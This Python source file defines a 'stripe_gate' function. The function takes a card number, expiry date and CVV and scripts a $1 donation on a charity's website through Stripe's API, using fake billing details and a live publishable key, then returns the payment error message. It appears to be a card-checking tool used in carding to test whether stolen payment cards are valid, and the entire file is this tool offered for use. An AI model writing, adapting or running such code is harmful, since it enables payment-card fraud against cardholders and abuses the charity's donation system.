from httpx import AsyncClient
from utilsdf.functions import random_proxy


async def stripe_gate(cc, mes, ano, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as client:
        # 1REQ
        post = {
            "form[name]": "Gabriel Rosa",
            "form[line1]": "123 Allen ST",
            "form[city]": "New York",
            "form[county]": "New York",
            "form[postcode]": "10002",
            "form[country]": "USA",
            "form[phone]": "18019632580",
            "form[email]": "sachiopremiun@gmail.com",
            "extras[informed]": "no",
            "stepData": "",
            "stepValue": "1",
        }
        await client.post(
            "https://www.abaana.org/donate/online",
            data=post,
        )

        # 2REQ
        post2 = {
            "paymentMethod": "card",
            "currency": "USD",
            "amount": "1",
            "project": "Any Project",
            "addFee": "0",
            "adminFee": "",
            "stepValue": "2",
        }
        await client.post(
            "https://www.abaana.org/donate/online/step2",
            data=post2,
        )

        # 3REQ
        post3 = {
            "type": "card",
            "billing_details[name]": "Sachio YT",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "guid": "N/A",
            "muid": "N/A",
            "sid": "N/A",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/c5d6d3bd0a; stripe-js-v3/c5d6d3bd0a",
            "time_on_page": "46566",
            "key": "pk_live_51LhtwiGPgaK6ulcPEN1I001VvS0Ke0SlidIqaDopfpahumzL2zhNQsfb8xI4QxelHGy4BbN2Va3hTEK7dtCkbfTO000GXTCC6H",
        }
        r3 = await client.post(
            "https://api.stripe.com/v1/payment_methods",
            data=post3,
        )
        data = r3.json()
        pm = data.get("id")

        # 4REQ
        post4 = {
            "do": "donate/online/step3",
            "stripeToken": pm,
            "addGiftAid": "0",
            "gift-aid": "0",
            "cardholder-name": "Gabriel Romero",
            "stepValue": "3",
        }
        await client.post(
            "https://www.abaana.org/donate/online/confirm",
            data=post4,
        )

        # 5REQ
        post5 = {
            "paymentMethod": "card",
            "currency": "USD",
            "amount": "1",
            "project": "Any Project",
            "addFee": "0",
            "adminFee": "",
            "stepValue": "2",
        }
        await client.post(
            "https://www.abaana.org/donate/online/step2",
            data=post5,
        )

        # 6REQ
        post6 = {"payment_method_id": pm, "site_area": "donation"}
        r6 = await client.post(
            "https://www.abaana.org/stripe-payment-intent",
            json=post6,
        )
        data = r6.json()
        msg = data.get("error", "UNAVAILABLE")
        return msg
